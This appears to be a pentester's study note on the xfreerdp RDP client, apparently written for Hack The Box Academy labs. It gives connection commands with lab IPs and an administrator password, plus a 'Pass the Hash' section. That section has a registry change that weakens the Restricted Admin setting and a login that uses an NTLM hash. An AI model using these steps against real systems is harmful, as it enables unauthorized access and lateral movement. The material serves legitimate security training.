---
tags:
  - Enumeration
  - TCP
  - RemoteDesktopProtocol
  - RDP
  - Tooling
---
[xfreerdp(1): FreeRDP X11 client - Linux man page](https://linux.die.net/man/1/xfreerdp)

xFreeRDP is an open-source remote desktop protocol (RDP) client that allows users to connect to a Windows desktop from a Linux, macOS, or other operating systems. It provides a graphical interface for accessing remote desktops and can be used for tasks such as remote administration, technical support, and accessing files and applications on a remote computer. xFreeRDP supports various RDP protocols and features, making it a versatile tool for remote desktop access.

# Command Example

```shell-session
xfreerdp /v:<targetIp> /u:User /p:Password
```

```shell-session
xfreerdp /u:Administrator /p:'HTB_@cad3my_lab_W1n10_r00t!@0' /v:10.129.23.147 /dynamic-resolution
```


## Pass the Hash

#### Enable Restricted Admin Mode to Allow PtH

```cmd-session
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```